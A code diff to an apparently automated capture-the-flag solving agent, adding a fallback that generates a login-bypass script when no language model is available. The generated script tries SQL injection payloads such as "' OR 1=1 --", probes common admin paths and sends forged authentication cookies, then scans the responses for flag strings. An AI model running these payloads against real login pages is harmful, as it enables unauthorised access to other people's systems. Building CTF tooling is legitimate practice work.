@@ -62,17 +62,75 @@ class CodingAgent(BaseAgent):
         Attempt to solve a coding challenge by generating and running a script.
         Includes a self-correction loop.
         """
+        # Get task description from inputs (passed by coordinator) or challenge description
+        task_desc = challenge.get('current_task_description') or challenge.get('description', 'Solve the challenge')
+        
         analysis = self.analyze_challenge(challenge)
         steps = []
         flag = None
         max_retries = 3
         
-        steps.append("Analyzed task requirements")
+        steps.append(f"Analyzed task requirements: {task_desc}")
         
-        # Generate script using reasoner
-        task_desc = challenge.get('description', 'Solve the challenge')
-        steps.append("Generating solution script via LLM...")
-        script_content = self.reasoner.generate_script(challenge, task_desc)
+        script_content = ""
+        if not self.reasoner.is_available:
+            # Heuristic: If it's a login bypass task, generate a simple script
+            if "login" in task_desc.lower() or "bypass" in task_desc.lower() or "authenticate" in task_desc.lower():
+                steps.append("LLM not available. Generating improved heuristic login bypass script...")
+                script_content = f"""
+import requests
+import re
+
+url = "{challenge.get('url', 'http://localhost')}"
+if not url.endswith('/'): url += '/'
+
+# Technique 1: SQL Injection payloads
+sqli_payloads = ["' OR 1=1 --", "admin' --", "admin' #", "' OR '1'='1"]
+
+# Technique 2: Common admin paths
+paths = ["", "admin", "dashboard", "api/admin"]
+
+# Technique 3: Auth cookies
+cookies = {{"admin": "true", "auth": "true", "authenticated": "true"}}
+
+session = requests.Session()
+
+for path in paths:
+    test_url = url + path
+    print(f"--- Testing URL: {{test_url}} ---")
+    
+    # Try with admin cookies first
+    try:
+        r = session.get(test_url, cookies=cookies)
+        if any(x in r.text for x in ["SKY-", "NCL-", "CTF{{", "HTB{{", "flag{{"]):
+            print(f"Success with cookie manipulation on {{test_url}}!")
+            print(r.text)
+            break
+    except: pass
+
+    # Try SQLi on login form (if it's a login page)
+    for p in sqli_payloads:
+        try:
+            # We try to POST to common field names
+            r = session.post(test_url, data={{"username": p, "password": "password", "user": p, "pass": "password"}})
+            if any(x in r.text for x in ["SKY-", "NCL-", "CTF{{", "HTB{{", "flag{{"]):
+                print(f"Success with SQLi payload {{p}} on {{test_url}}!")
+                print(r.text)
+                break
+        except: pass
+"""
+            else:
+                steps.append("Error: LLM not available for script generation and no heuristic applies.")
+                return {
+                    'challenge_id': challenge.get('id'),
+                    'agent_id': self.agent_id,
+                    'status': 'failed',
+                    'flag': None,
+                    'steps': steps
+                }
+        else:
+            steps.append("Generating solution script via LLM...")
+            script_content = self.reasoner.generate_script(challenge, task_desc)
         
         if script_content.startswith("# LLM not available"):
             steps.append("Error: LLM not available for script generation.")
